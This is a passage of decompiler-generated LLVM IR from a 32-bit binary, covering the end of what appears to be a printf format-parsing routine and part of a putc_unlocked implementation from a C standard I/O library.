  %v3_804ef23 = inttoptr i32 %v2_804ef23 to i32*
  store i32 %v0_804ef23, i32* %v3_804ef23, align 4
  %v0_804ef26 = load i32, i32* @ecx, align 4
  %v1_804ef26 = inttoptr i32 %v0_804ef26 to i8*
  %v2_804ef26 = load i8, i8* %v1_804ef26, align 1
  %v3_804ef26 = icmp eq i8 %v2_804ef26, 0
  %v1_804ef29 = icmp eq i1 %v3_804ef26, false
  br i1 %v1_804ef29, label %dec_label_pc_804ef42, label %dec_label_pc_804ef2b

dec_label_pc_804ef2b:                             ; preds = %dec_label_pc_804eee6
  %v0_804ef2b = load i32, i32* @esi, align 4
  %v1_804ef2b = inttoptr i32 %v0_804ef2b to i8*
  %v2_804ef2b = load i8, i8* %v1_804ef2b, align 1
  %v11_804ef2b = icmp eq i8 %v2_804ef2b, 109
  %v1_804ef2e = icmp eq i1 %v11_804ef2b, false
  br i1 %v1_804ef2e, label %dec_label_pc_804f034, label %dec_label_pc_804ef34

dec_label_pc_804ef34:                             ; preds = %dec_label_pc_804ef2b
  %v0_804ef34 = load i32, i32* @edx, align 4
  %v1_804ef34 = add i32 %v0_804ef34, 32
  %v2_804ef34 = inttoptr i32 %v1_804ef34 to i32*
  store i32 20, i32* %v2_804ef34, align 4
  %v0_804ef3b = load i32, i32* @edx, align 4
  %v1_804ef3b = add i32 %v0_804ef3b, 28
  %v2_804ef3b = inttoptr i32 %v1_804ef3b to i32*
  store i32 0, i32* %v2_804ef3b, align 4
  br label %dec_label_pc_804ef42

dec_label_pc_804ef42:                             ; preds = %dec_label_pc_804eee6, %dec_label_pc_804ef34
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804efd6, label %dec_label_pc_804ef4d

dec_label_pc_804ef4d:                             ; preds = %dec_label_pc_804ef42
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804ef8e = add i32 %tmp76, 40
  %v1_804efc7 = add i32 %tmp76, 28
  %v2_804efc7 = inttoptr i32 %v1_804efc7 to i32*
  %v4_804ef5c = add i32 %tmp76, 36
  br label %dec_label_pc_804ef4f

dec_label_pc_804ef4f:                             ; preds = %dec_label_pc_804efc2, %dec_label_pc_804ef4d
  %v0_804ef65 = phi i32 [ 0, %dec_label_pc_804ef4d ], [ %v1_804efc6, %dec_label_pc_804efc2 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ef4d ], [ %stack_var_-88.5, %dec_label_pc_804efc2 ]
  %v1_804ef4f = add i32 %v0_804ef65, -2
  %v6_804ef4f = sub i32 1, %v0_804ef65
  %v7_804ef4f = and i32 %v6_804ef4f, %v0_804ef65
  %v8_804ef4f = icmp slt i32 %v7_804ef4f, 0
  %v9_804ef4f = icmp eq i32 %v1_804ef4f, 0
  %v10_804ef4f = icmp slt i32 %v1_804ef4f, 0
  %v3_804ef52 = icmp eq i1 %v10_804ef4f, %v8_804ef4f
  %v4_804ef52 = icmp eq i1 %v9_804ef4f, false
  %v5_804ef52 = and i1 %v4_804ef52, %v3_804ef52
  br i1 %v5_804ef52, label %dec_label_pc_804ef65, label %dec_label_pc_804ef54

dec_label_pc_804ef54:                             ; preds = %dec_label_pc_804ef4f
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ef58 = load i32, i32* @esp, align 4
  %v2_804ef58 = mul i32 %v0_804ef65, 4
  %v3_804ef58 = add i32 %v2_804ef58, 68
  %v4_804ef58 = add i32 %v3_804ef58, %v0_804ef58
  %v5_804ef58 = inttoptr i32 %v4_804ef58 to i32*
  %v6_804ef58 = load i32, i32* %v5_804ef58, align 4
  store i32 %v6_804ef58, i32* %eax.global-to-local, align 4
  %v1_804ef5c = trunc i32 %v6_804ef58 to i8
  %v5_804ef5c = add i32 %v4_804ef5c, %v0_804ef65
  %v6_804ef5c = inttoptr i32 %v5_804ef5c to i8*
  store i8 %v1_804ef5c, i8* %v6_804ef5c, align 1
  %v0_804ef60 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef60 = urem i32 %v0_804ef60, 256
  br label %dec_label_pc_804ef6e

dec_label_pc_804ef65:                             ; preds = %dec_label_pc_804ef4f
  %v5_804ef67 = add i32 %v0_804ef65, %stack_var_-32.3
  store i32 %v5_804ef67, i32* %eax.global-to-local, align 4
  %v1_804ef6b = add i32 %v5_804ef67, -2
  br label %dec_label_pc_804ef6e

dec_label_pc_804ef6e:                             ; preds = %dec_label_pc_804ef54, %dec_label_pc_804ef65
  %v0_804ef81 = phi i32 [ %v1_804ef60, %dec_label_pc_804ef54 ], [ %v1_804ef6b, %dec_label_pc_804ef65 ]
  store i32 %v0_804ef81, i32* %eax.global-to-local, align 4
  %v5_804ef6e = sub i32 %v0_804ef81, %stack_var_-88.4
  %v11_804ef6e = xor i32 %v0_804ef81, %stack_var_-88.4
  %v12_804ef6e = xor i32 %v5_804ef6e, %v0_804ef81
  %v13_804ef6e = and i32 %v12_804ef6e, %v11_804ef6e
  %v14_804ef6e = icmp slt i32 %v13_804ef6e, 0
  %v15_804ef6e = icmp eq i32 %v5_804ef6e, 0
  %v16_804ef6e = icmp slt i32 %v5_804ef6e, 0
  %v3_804ef72 = icmp ne i1 %v16_804ef6e, %v14_804ef6e
  %v4_804ef72 = or i1 %v15_804ef6e, %v3_804ef72
  br i1 %v4_804ef72, label %dec_label_pc_804ef81, label %dec_label_pc_804ef74

dec_label_pc_804ef74:                             ; preds = %dec_label_pc_804ef6e
  %v1_804ef74 = add i32 %v0_804ef81, -9
  %v6_804ef74 = sub i32 8, %v0_804ef81
  %v7_804ef74 = and i32 %v6_804ef74, %v0_804ef81
  %v8_804ef74 = icmp slt i32 %v7_804ef74, 0
  %v9_804ef74 = icmp eq i32 %v1_804ef74, 0
  %v10_804ef74 = icmp slt i32 %v1_804ef74, 0
  %v3_804ef77 = icmp eq i1 %v10_804ef74, %v8_804ef74
  %v4_804ef77 = icmp eq i1 %v9_804ef74, false
  %v5_804ef77 = and i1 %v4_804ef77, %v3_804ef77
  br i1 %v5_804ef77, label %dec_label_pc_804f034, label %dec_label_pc_804ef81

dec_label_pc_804ef81:                             ; preds = %dec_label_pc_804ef74, %dec_label_pc_804ef6e
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804ef6e ], [ %v0_804ef81, %dec_label_pc_804ef74 ]
  %v1_804ef81 = add i32 %v0_804ef81, -1
  store i32 %v1_804ef81, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ef8a = load i32, i32* @esp, align 4
  %v1_804ef8a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ef8a = mul i32 %v1_804ef8a, 4
  %v3_804ef8a = add i32 %v0_804ef8a, 80
  %v4_804ef8a = add i32 %v3_804ef8a, %v2_804ef8a
  %v5_804ef8a = inttoptr i32 %v4_804ef8a to i32*
  %v6_804ef8a = load i32, i32* %v5_804ef8a, align 4
  store i32 %v6_804ef8a, i32* %edi.global-to-local, align 4
  %v2_804ef8e = mul i32 %v1_804ef81, 4
  %v4_804ef8e = add i32 %v3_804ef8e, %v2_804ef8e
  %v5_804ef8e = inttoptr i32 %v4_804ef8e to i32*
  %v6_804ef8e = load i32, i32* %v5_804ef8e, align 4
  store i32 %v6_804ef8e, i32* @eax, align 4
  %v9_804ef92 = icmp eq i32 %v6_804ef8a, 8
  br i1 %v9_804ef92, label %dec_label_pc_804efc2, label %dec_label_pc_804ef97

dec_label_pc_804ef97:                             ; preds = %dec_label_pc_804ef81
  %v9_804ef97 = icmp eq i32 %v6_804ef8e, 8
  br i1 %v9_804ef97, label %dec_label_pc_804efb2, label %dec_label_pc_804ef9c

dec_label_pc_804ef9c:                             ; preds = %dec_label_pc_804ef97
  %v12_804ef9c = icmp eq i32 %v6_804ef8e, %v6_804ef8a
  br i1 %v12_804ef9c, label %dec_label_pc_804efb2, label %dec_label_pc_804efa0

dec_label_pc_804efa0:                             ; preds = %dec_label_pc_804ef9c
  %v1_804efa0 = call i32 @_promoted_size(i32 %v1_804ef81)
  store i32 %v1_804efa0, i32* %ebx.global-to-local, align 4
  %v0_804efa7 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804efa7, i32* @eax, align 4
  %v1_804efa9 = call i32 @_promoted_size(i32 %v1_804ef81)
  store i32 %v1_804efa9, i32* %eax.global-to-local, align 4
  %v8_804efb0 = icmp sgt i32 %v1_804efa0, %v1_804efa9
  br i1 %v8_804efb0, label %dec_label_pc_804efc2, label %dec_label_pc_804efa0.dec_label_pc_804efb2_crit_edge

dec_label_pc_804efa0.dec_label_pc_804efb2_crit_edge: ; preds = %dec_label_pc_804efa0
  %v0_804efba.pre = load i32, i32* @esp, align 4
  %v1_804efba.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804efb2

dec_label_pc_804efb2:                             ; preds = %dec_label_pc_804efa0.dec_label_pc_804efb2_crit_edge, %dec_label_pc_804ef9c, %dec_label_pc_804ef97
  %v1_804efba = phi i32 [ %v1_804efba.pre, %dec_label_pc_804efa0.dec_label_pc_804efb2_crit_edge ], [ %v1_804ef8a, %dec_label_pc_804ef9c ], [ %v1_804ef8a, %dec_label_pc_804ef97 ]
  %v0_804efba = phi i32 [ %v0_804efba.pre, %dec_label_pc_804efa0.dec_label_pc_804efb2_crit_edge ], [ %v0_804ef8a, %dec_label_pc_804ef9c ], [ %v0_804ef8a, %dec_label_pc_804ef97 ]
  store i32 %v1_804ef81, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804efba = mul i32 %v1_804efba, 4
  %v3_804efba = add i32 %v0_804efba, 80
  %v4_804efba = add i32 %v3_804efba, %v2_804efba
  %v5_804efba = inttoptr i32 %v4_804efba to i32*
  %v6_804efba = load i32, i32* %v5_804efba, align 4
  store i32 %v6_804efba, i32* %eax.global-to-local, align 4
  store i32 %v6_804efba, i32* %v5_804ef8e, align 4
  br label %dec_label_pc_804efc2

dec_label_pc_804efc2:                             ; preds = %dec_label_pc_804efa0, %dec_label_pc_804ef81, %dec_label_pc_804efb2
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804efc6 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804efc6 = add i32 %v0_804efc6, 1
  store i32 %v1_804efc6, i32* %ebp.global-to-local, align 4
  %v3_804efc7 = load i32, i32* %v2_804efc7, align 4
  %v1_804efca = add i32 %v3_804efc7, 2
  store i32 %v1_804efca, i32* %eax.global-to-local, align 4
  %v5_804efcf = icmp slt i32 %v1_804efc6, %v1_804efca
  br i1 %v5_804efcf, label %dec_label_pc_804ef4f, label %dec_label_pc_804effd

dec_label_pc_804efd6:                             ; preds = %dec_label_pc_804ef42
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804efda = add i32 %tmp76, 38
  %v2_804efda = inttoptr i32 %v1_804efda to i8*
  store i8 1, i8* %v2_804efda, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804efe3 = add i32 %tmp76, 28
  %v2_804efe3 = inttoptr i32 %v1_804efe3 to i32*
  %v3_804efe3 = load i32, i32* %v2_804efe3, align 4
  %v2_804efe6 = mul i32 %v3_804efe3, 4
  %v2_804efea = ptrtoint i32* %stack_var_-20 to i32
  %v1_804eff1 = add i32 %tmp76, 40
  store i32 %v1_804eff1, i32* %eax.global-to-local, align 4
  %v3_804eff5 = inttoptr i32 %v1_804eff1 to i16*
  %v4_804eff5 = call i32 @memcpy(i16* %v3_804eff5, i32 %v2_804efea, i32 %v2_804efe6)
  store i32 %v4_804eff5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804effd

dec_label_pc_804effd:                             ; preds = %dec_label_pc_804efc2, %dec_label_pc_804efd6
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804efd6 ], [ %stack_var_-88.5, %dec_label_pc_804efc2 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804eca8, align 4
  %v0_804f008 = load i32, i32* @ecx, align 4
  %v1_804f008 = add i32 %v0_804f008, 16
  %v2_804f008 = inttoptr i32 %v1_804f008 to i8*
  %v3_804f008 = load i8, i8* %v2_804f008, align 1
  %v5_804f008 = icmp slt i8 %v3_804f008, 0
  br i1 %v5_804f008, label %dec_label_pc_804f015, label %dec_label_pc_804f00e

dec_label_pc_804f00e:                             ; preds = %dec_label_pc_804effd
  %v0_804f00e = load i32, i32* @esi, align 4
  %v1_804f00e = add i32 %v0_804f00e, 1
  store i32 %v1_804f00e, i32* %eax.global-to-local, align 4
  %v2_804f011 = inttoptr i32 %v0_804f008 to i32*
  store i32 %v1_804f00e, i32* %v2_804f011, align 4
  br label %dec_label_pc_804f028

dec_label_pc_804f015:                             ; preds = %dec_label_pc_804effd
  store i32 %v4_804ec7c, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804f01d = load i32, i32* @esi, align 4
  %v2_804f01d = sub i32 %v0_804f01d, %v4_804ec7c
  store i32 %v2_804f01d, i32* %esi.global-to-local, align 4
  %v1_804f01f = mul i32 %v2_804f01d, 4
  %v2_804f01f = add i32 %v1_804f01f, 224
  store i32 %v2_804f01f, i32* %eax.global-to-local, align 4
  %v2_804f026 = load i32, i32* %arg1, align 4
  %v4_804f026 = add i32 %v2_804f026, %v2_804f01f
  store i32 %v4_804f026, i32* %arg1, align 4
  br label %dec_label_pc_804f028

dec_label_pc_804f028:                             ; preds = %dec_label_pc_804f00e, %dec_label_pc_804f015
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f02c = add i32 %tmp76, 28
  %v2_804f02c = inttoptr i32 %v1_804f02c to i32*
  %v3_804f02c = load i32, i32* %v2_804f02c, align 4
  store i32 %v3_804f02c, i32* %eax.global-to-local, align 4
  %v1_804f02f = add i32 %v3_804f02c, 2
  br label %dec_label_pc_804f037

dec_label_pc_804f034:                             ; preds = %dec_label_pc_804eccd, %dec_label_pc_804ed67, %dec_label_pc_804ed9a, %dec_label_pc_804ee15, %dec_label_pc_804ee01, %dec_label_pc_804edf8, %dec_label_pc_804ef74, %dec_label_pc_804ef2b, %dec_label_pc_804ee77
  br label %dec_label_pc_804f037

dec_label_pc_804f037:                             ; preds = %dec_label_pc_804f028, %dec_label_pc_804f034
  %storemerge6 = phi i32 [ %v1_804f02f, %dec_label_pc_804f028 ], [ -1, %dec_label_pc_804f034 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804f03a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f03a, i32* @ebx, align 4
  store i32 %v0_804ec7b, i32* @esi, align 4
  store i32 %v0_804ec7a, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804efc6, { 0, 2, 1 }
  uselistorder i32 %v1_804ef81, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ef74, { 1, 0 }
  uselistorder i32 %v5_804ef6e, { 1, 2, 0 }
  uselistorder i32 %v0_804ef81, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804ef4f, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804ef65, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804eee0, { 1, 2, 0 }
  uselistorder i32 %v1_804eeb6, { 1, 2, 0 }
  uselistorder i32 %v0_804eee0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804ee7b, { 1, 0 }
  uselistorder i32 %v1_804ee6a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804ee73, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804ee5d, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804ee53, { 1, 0 }
  uselistorder i32 %v1_804ee35, { 1, 0 }
  uselistorder i32 %v0_804ee53.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804ee18, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804ee0f, { 1, 2, 0 }
  uselistorder i32 %v0_804edd5, { 1, 0 }
  uselistorder i32 %v1_804edc7, { 1, 0 }
  uselistorder i32 %v1_804edc2, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804edc0, { 2, 0, 1 }
  uselistorder i32 %v0_804ede2, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804ed7d, { 1, 2, 0 }
  uselistorder i32 %v0_804ed55, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804ed48.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804ed41.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804ed4b, { 1, 2, 0 }
  uselistorder i32 %v6_804ed49, { 0, 2, 1 }
  uselistorder i32 %v1_804ed48, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804ed41, { 2, 1, 0 }
  uselistorder i32 %v1_804ed39, { 1, 0 }
  uselistorder i32 %v1_804ed41137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804ed31, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804ed24, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804ed1f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804ecf5, { 0, 2, 1 }
  uselistorder i32 %v2_804ece4, { 1, 0 }
  uselistorder i32 %v0_804ece2, { 2, 0, 1 }
  uselistorder i32 %v4_804ec7c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 0, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 4, 0, 1, 2, 3 }
  uselistorder i32 -134558155, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_80531d5.109 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804f037, { 1, 0 }
  uselistorder label %dec_label_pc_804f034, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f028, { 1, 0 }
  uselistorder label %dec_label_pc_804effd, { 1, 0 }
  uselistorder label %dec_label_pc_804efc2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ef42, { 1, 0 }
  uselistorder label %dec_label_pc_804eeaa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ee77, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ee4e, { 1, 0 }
  uselistorder label %dec_label_pc_804ee25, { 1, 0 }
  uselistorder label %dec_label_pc_804edec, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804ed8f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ed48, { 1, 0 }
  uselistorder label %dec_label_pc_804ed39, { 1, 0 }
  uselistorder label %dec_label_pc_804ed2f, { 1, 0 }
  uselistorder label %dec_label_pc_804ed18, { 1, 0 }
  uselistorder label %dec_label_pc_804ed18.outer, { 2, 0, 1 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_804f041 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804f049 = sext i8 %arg1 to i32
  store i32 %v4_804f049, i32* @esi, align 4
  %v1_804f04d = add i32 %arg2, 16
  %v2_804f04d = inttoptr i32 %v1_804f04d to i32*
  %v3_804f04d = load i32, i32* %v2_804f04d, align 4
  store i32 %v3_804f04d, i32* %eax.global-to-local, align 4
  %v2_804f050 = add i32 %arg2, 28
  %v3_804f050 = inttoptr i32 %v2_804f050 to i32*
  %v4_804f050 = load i32, i32* %v3_804f050, align 4
  %v10_804f050 = icmp ult i32 %v3_804f04d, %v4_804f050
  %v1_804f053 = icmp eq i1 %v10_804f050, false
  br i1 %v1_804f053, label %dec_label_pc_804f062, label %dec_label_pc_804f055

dec_label_pc_804f055:                             ; preds = %entry
  store i32 %v4_804f049, i32* %edx.global-to-local, align 4
  %v3_804f057 = inttoptr i32 %v3_804f04d to i8*
  store i8 %arg1, i8* %v3_804f057, align 1
  %v0_804f059 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f059 = add i32 %v0_804f059, 1
  store i32 %v1_804f059, i32* %eax.global-to-local, align 4
  %v1_804f05a = load i32, i32* @ebx, align 4
  %v2_804f05a = add i32 %v1_804f05a, 16
  %v3_804f05a = inttoptr i32 %v2_804f05a to i32*
  store i32 %v1_804f059, i32* %v3_804f05a, align 4
  %v0_804f0f7.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804f062:                             ; preds = %entry
  %v1_804f062 = inttoptr i32 %arg2 to i16*
  %v2_804f062 = load i16, i16* %v1_804f062, align 2
  %v3_804f062 = zext i16 %v2_804f062 to i32
  %v1_804f065 = and i32 %v3_804f062, 192
  store i32 %v1_804f065, i32* %eax.global-to-local, align 4
  %v6_804f06a = icmp eq i32 %v1_804f065, 192
  br i1 %v6_804f06a, label %dec_label_pc_804f085, label %dec_label_pc_804f071

dec_label_pc_804f071:                             ; preds = %dec_label_pc_804f062
  %v0_804f071 = load i32, i32* @edx, align 4
  %sext = mul i32 %v0_804f071, 16777216
  %v5_804f079 = sdiv i32 %sext, 16777216
  %v7_804f079 = call i32 @__stdio_trans2w_o(i16* %v1_804f062, i32 128, i32 %v0_804f071, i32 %v5_804f079)
  store i32 %v7_804f079, i32* %eax.global-to-local, align 4
  %v1_804f081 = icmp eq i32 %v7_804f079, 0
  %v1_804f083 = icmp eq i1 %v1_804f081, false
  br i1 %v1_804f083, label %dec_label_pc_804f0fc, label %dec_label_pc_804f071.dec_label_pc_804f085_crit_edge

dec_label_pc_804f071.dec_label_pc_804f085_crit_edge: ; preds = %dec_label_pc_804f071
  %v0_804f085.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f085

dec_label_pc_804f085:                             ; preds = %dec_label_pc_804f071.dec_label_pc_804f085_crit_edge, %dec_label_pc_804f062
  %v0_804f0e8 = phi i32 [ %v0_804f085.pre, %dec_label_pc_804f071.dec_label_pc_804f085_crit_edge ], [ %arg2, %dec_label_pc_804f062 ]
  %v1_804f085 = add i32 %v0_804f0e8, 4
  %v2_804f085 = inttoptr i32 %v1_804f085 to i32*
  %v3_804f085 = load i32, i32* %v2_804f085, align 4
  %v13_804f085 = icmp eq i32 %v3_804f085, -2
  %v1_804f089 = icmp eq i1 %v13_804f085, false
  br i1 %v1_804f089, label %dec_label_pc_804f092, label %dec_label_pc_804f08b

dec_label_pc_804f08b:                             ; preds = %dec_label_pc_804f085
  %v0_804f08b = load i32, i32* @esi, align 4
  %v1_804f08d = urem i32 %v0_804f08b, 256
  store i32 %v1_804f08d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0ff

dec_label_pc_804f092:                             ; preds = %dec_label_pc_804f085
  %v1_804f092 = add i32 %v0_804f0e8, 12
  %v2_804f092 = inttoptr i32 %v1_804f092 to i32*
  %v3_804f092 = load i32, i32* %v2_804f092, align 4
  store i32 %v3_804f092, i32* %eax.global-to-local, align 4
  %v2_804f095 = add i32 %v0_804f0e8, 8
  %v3_804f095 = inttoptr i32 %v2_804f095 to i32*
  %v4_804f095 = load i32, i32* %v3_804f095, align 4
  %v15_804f095 = icmp eq i32 %v3_804f092, %v4_804f095
  br i1 %v15_804f095, label %dec_label_pc_804f0da, label %dec_label_pc_804f09a

dec_label_pc_804f09a:                             ; preds = %dec_label_pc_804f092
  %v2_804f09a = add i32 %v0_804f0e8, 16
  %v3_804f09a = inttoptr i32 %v2_804f09a to i32*
  %v4_804f09a = load i32, i32* %v3_804f09a, align 4
  %v15_804f09a = icmp eq i32 %v3_804f092, %v4_804f09a
  %v1_804f09d = icmp eq i1 %v15_804f09a, false
  br i1 %v1_804f09d, label %dec_label_pc_804f0af, label %dec_label_pc_804f09f

dec_label_pc_804f09f:                             ; preds = %dec_label_pc_804f09a
  %v2_804f0a3 = call i32 @__stdio_wcommit(i32 %v0_804f0e8)
  store i32 %v2_804f0a3, i32* %eax.global-to-local, align 4
  %v1_804f0ab = icmp eq i32 %v2_804f0a3, 0
  %v1_804f0ad = icmp eq i1 %v1_804f0ab, false
  br i1 %v1_804f0ad, label %dec_label_pc_804f0fc, label %dec_label_pc_804f09f.dec_label_pc_804f0af_crit_edge

dec_label_pc_804f09f.dec_label_pc_804f0af_crit_edge: ; preds = %dec_label_pc_804f09f
  %v0_804f0af.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f0af

dec_label_pc_804f0af:                             ; preds = %dec_label_pc_804f09f.dec_label_pc_804f0af_crit_edge, %dec_label_pc_804f09a
  %v0_804f0af = phi i32 [ %v0_804f0af.pre, %dec_label_pc_804f09f.dec_label_pc_804f0af_crit_edge ], [ %v0_804f0e8, %dec_label_pc_804f09a ]
  %v1_804f0af = add i32 %v0_804f0af, 16
  %v2_804f0af = inttoptr i32 %v1_804f0af to i32*
  %v3_804f0af = load i32, i32* %v2_804f0af, align 4
  store i32 %v3_804f0af, i32* %eax.global-to-local, align 4
  %v0_804f0b2 = load i32, i32* @esi, align 4
  store i32 %v0_804f0b2, i32* %edx.global-to-local, align 4
  %v1_804f0b4 = trunc i32 %v0_804f0b2 to i8
  %v3_804f0b4 = inttoptr i32 %v3_804f0af to i8*
  store i8 %v1_804f0b4, i8* %v3_804f0b4, align 1
  %v0_804f0b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0b6 = add i32 %v0_804f0b6, 1
  store i32 %v1_804f0b6, i32* %eax.global-to-local, align 4
  %v1_804f0b7 = load i32, i32* @ebx, align 4
  %v2_804f0b7 = add i32 %v1_804f0b7, 16
  %v3_804f0b7 = inttoptr i32 %v2_804f0b7 to i32*
  store i32 %v1_804f0b6, i32* %v3_804f0b7, align 4
  %v0_804f0ba = load i32, i32* @ebx, align 4
  %v1_804f0ba = add i32 %v0_804f0ba, 1
  %v2_804f0ba = inttoptr i32 %v1_804f0ba to i8*
  %v3_804f0ba = load i8, i8* %v2_804f0ba, align 1
  %v4_804f0ba = urem i8 %v3_804f0ba, 2
  %v5_804f0ba = icmp eq i8 %v4_804f0ba, 0
  br i1 %v5_804f0ba, label %dec_label_pc_804f0f5, label %dec_label_pc_804f0c0

dec_label_pc_804f0c0:                             ; preds = %dec_label_pc_804f0af
  %v0_804f0c0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0c0 = trunc i32 %v0_804f0c0 to i8
  %v10_804f0c0 = icmp eq i8 %v1_804f0c0, 10
  %v1_804f0c3 = icmp eq i1 %v10_804f0c0, false
  br i1 %v1_804f0c3, label %dec_label_pc_804f0f5, label %dec_label_pc_804f0c5

dec_label_pc_804f0c5:                             ; preds = %dec_label_pc_804f0c0
  %v2_804f0c9 = call i32 @__stdio_wcommit(i32 %v0_804f0ba)
  store i32 %v2_804f0c9, i32* %eax.global-to-local, align 4
  %v1_804f0d1 = icmp eq i32 %v2_804f0c9, 0
  br i1 %v1_804f0d1, label %dec_label_pc_804f0f5, label %dec_label_pc_804f0d5

dec_label_pc_804f0d5:                             ; preds = %dec_label_pc_804f0c5
  %v0_804f0d5 = load i32, i32* @ebx, align 4
  %v1_804f0d5 = add i32 %v0_804f0d5, 16
  %v2_804f0d5 = inttoptr i32 %v1_804f0d5 to i32*
  %v3_804f0d5 = load i32, i32* %v2_804f0d5, align 4
  %v4_804f0d5 = add i32 %v3_804f0d5, -1
  store i32 %v4_804f0d5, i32* %v2_804f0d5, align 4
  br label %dec_label_pc_804f0fc

dec_label_pc_804f0da:                             ; preds = %dec_label_pc_804f092
  %v0_804f0da = load i32, i32* @esi, align 4
  %v6_804f0dc = trunc i32 %v0_804f0da to i8
  store i8 %v6_804f0dc, i8* %stack_var_-9, align 1
  %v2_804f0e3 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_804f0e3, i32* %eax.global-to-local, align 4
  %v5_804f0e8 = inttoptr i32 %v0_804f0e8 to i16*
  %sext9 = mul i32 %v0_804f0da, 16777216
  %v5_804f0e9 = sdiv i32 %sext9, 16777216
  %v7_804f0e9 = call i32 @__stdio_WRITE(i16* %v5_804f0e8, i32 %v2_804f0e3, i32 1, i32 %v5_804f0e9)
  store i32 %v7_804f0e9, i32* %eax.global-to-local, align 4
